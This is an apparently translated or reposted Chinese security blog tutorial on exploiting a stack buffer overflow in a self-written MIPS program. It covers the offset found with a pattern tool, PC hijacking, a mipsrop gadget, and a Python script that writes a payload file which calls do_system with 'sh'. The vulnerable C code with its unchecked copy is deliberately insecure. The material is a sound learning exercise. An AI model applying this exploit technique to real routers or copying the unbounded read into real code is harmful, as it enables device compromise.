# MIPS缓冲区溢出漏洞实践

阅读量 **221182**

|评论 **6**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-06-25 14:00:49

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t014bcf31a3c4919058.png)

这份实践来自于学习-解密路由器漏洞的笔记和总结。主要用来回顾和巩固整个过程，整个过程里面不是非常顺利，主要的问题点在于对于溢出函数的地址的确定。  
这个自己写的漏洞代码主要基于MIPS的编译器进行编译，通过这份基础的溢出漏洞学习，主要用来为之后在路由器的漏洞溢出实践中打好基础。  
下面开始review整个过程。

## 1\. 首先我们来看看自己写的一个存在溢出漏洞的源代码

    
    
    #include <stdio.h>
    #include <sys/stat.h>
    #include <unistd.h>
    void do_system(int code,char *cmd)
    {
        char buf[255];
        //sleep(1);
        system(cmd);
    }
    
    void main()
    {
        char buf[256]={0};
        char ch;
        int count = 0;
        unsigned int fileLen = 0;
        struct stat fileData;
        FILE *fp;
    
        if(0 == stat("passwd",&fileData))
            fileLen = fileData.st_size;
        else
            return 1;
    
        if((fp = fopen("passwd","rb")) == NULL)
        {
            printf("Cannot open file passwd!n");
            exit(1);
        }    
        ch=fgetc(fp);
        while(count <= fileLen)
        {
            buf[count++] = ch;
            ch = fgetc(fp);
        }
        buf[--count] = 'x00';
    
        if(!strcmp(buf,"adminpwd"))
        {        
            do_system(count,"ls -l");
        }
        else
        {
            printf("you have an invalid password!n");
        }
        fclose(fp);
    }
    

这份代码的主要功能就是从文档“passwd”读取密码，如果密码为adminpwd，那么就执行ls
–l的指令，从而查看文件的列表。可以发现这里有个溢出的缓冲区就是来自于输入的文档“passwd”然后赋值到buf里面，由于没有对buf进行控制，所以可能产生溢出漏洞。这里我们也主要针对这个漏洞进行测试。

那么总结下来挖掘一个MIPS漏洞的过程如下：  
A． 确定能够覆盖函数地址的偏移，即劫持PC；  
B． 寻找可以用来执行命令的函数；  
C． 构造ROP chain；  
D． 漏洞利用测试。

## 2\. 首先来确定函数的偏移，可以利用教材自带的字符串溢出测试工具进行测试

    
    
    $ python patternLocOffset.py –c –l 600 –f passwd
    [*] Create pattern string contains 600 characters ok!
    [+] output to passwd ok!
    [+] take time: 0.0026 s
    

通过这个命令可以产生一个长度为600的溢出测试字符串，并且存储到名为passwd的文件中。

## 3\. 利用IDA进行MIPS程序的附加调试，在main函数返回函数之前下好断点，然后附加程序运行起来

![](https://p3.ssl.qhimg.com/t01651da118b8dc4ecc.png)

## 4\. 可以发现覆盖的内容为0x6e37416e， 那么接下来再次利用脚本来测试一下偏移是多少，可以得到偏移是412

    
    
    $ python patternLocOffset.py -l 600 -s 0x6E37416E
    [*] Create pattern string contains 600 characters ok!
    [*] Exact match at offset 412
    [+] take time: 0.0036 s
    

## 5\. 偏移确定了，那么我们就可以控制PC了，我们检测测试一下是否成功控制了PC，往passwd里面增加412个‘A’和接下来的4个‘B’

  
可以发现，我们可以成功控制PC。

## 6\. PC可以控制了，接下来我们就看如何溢出到函数的位置

有两种方式进行漏洞利用：1）复用程序里面的函数调用；2）构造shellcode。
我们这里主要进行程序里面函数复用的测试方式，shellcode的方式在之后再进行测试和使用。通过前面的程序内容分析，可以发现，系统里面有一个函数do_system_0函数可以执行指令：ls
–l。 虽然仅仅只能执行一个命令，
但是只要对该函数的参数进行有效的溢出攻击，那么就能够实现任意系统命令的执行。在此之前，我们需要找一下可以构造函数溢出并且能够返回的一个中间跳转代码块，这里利用IDA的plugin
mipsrop进行寻找：  

指令执行之后，可以找到这个位置的代码进行测试：text:00402050. 然后到对应的代码段看，

![](https://p1.ssl.qhimg.com/t01655810512310b8a8.png)

可以发现这段代码的功能，只要在$SP+0x54的位置存入需要执行的do_system_0函数的地址，然后在$SP+0x18的位置放入需要传入的指令，就能够实现任意命令的执行。

## 7\. 所以，可以发现在添加了PC的偏移之后，需要再相隔0x18个byte再放置需要执行的系统函数的字符串，
然后在PC偏移之后相隔0x54个byte放置需要执行的函数的地址，也就是do_system_0的地址

![](https://p3.ssl.qhimg.com/t01a5f39b96d5b48d7b.png)

从上面的截图中可以发现do_system_0的函数䢑为0x00400420.

## 8\. 那么我们就可以尝试按照下面的方式构造一个passwd文件测试一下

    
    
    import struct
    
    cmd = "sh"                 # command string
    cmd += "x00"*(4 - (len(cmd) % 4))    # align by 4 bytes
    
    #shellcode
    shellcode = "A"*0x19C             # padding buf
    shellcode += struct.pack(">L",0x00402050)     # "x00x40x1FxA0"(PC)
    shellcode += "A"*24                # padding before command
    shellcode += cmd                # command($a1)
    shellcode += "B"*(0x3C - len(cmd))        # padding 
    shellcode += struct.pack(">L",0x00400420)     # "x00x40x05x90"
    shellcode += "BBBB"                # padding
    
    print ' ok!'
    
    #create password file
    print '[+] create password file',
    fw = open('passwd','w')
    fw.write(shellcode)#'A'*300+'x00'*10+'BBBB')
    fw.close()
    print ' ok!'
    

## 9\. 构造了之后，可以直接用下面的方式进行执行

![](https://p2.ssl.qhimg.com/t01cf4c101eaedc96b5.png)

可以发现成功的进行了漏洞的利用，

到这里，MIPS程序的基础的漏洞利用测试就完成了。

## 总结

这个程序里面有一个内部的do_system_0函数，并且不安全的输入源是输入文件passwd可以用来构造溢出漏洞文件。在之后的程序利用中，很可能主功能的程序里面并没有一个可以利用的函数让我们进行函数的溢出漏洞利用，需要进行shellcode的设计，即从系统库函数里面找到system函数，并且调用与执行。后者的问题稍微麻烦些。  
且，当前的这个函数do_system_0里面，对于输入字符串的读取，并不是一个字符串方式的提取，因此，如果是字符串的提取，会对于一些字节进行截取：0x00，如果指令里面存在这样的字符串，可能会导致注入程序的字符串被截断，从而导致程序漏洞利用失败。为此，需要进行shellcode编码或者用其他指令代替或者多跳转几次ROP
chain从而将bad byte消除。

下一次将继续分享总结，如何进行shellcode的编码以绕过字符串截断的问题。

审核人：yiwang 编辑：边边

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **desword** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/148551](/post/id/148551)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [缓冲区溢出](/tag/缓冲区溢出)
  * [技术分析](/tag/技术分析)
  * [安全研究](/tag/安全研究)
  * [MIPS](/tag/MIPS)

 **+1** __16赞

 __收藏

![](https://p1.ssl.qhmsg.com/dm/200_200_100/t01f63ac26a9939acbd.jpg) desword

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

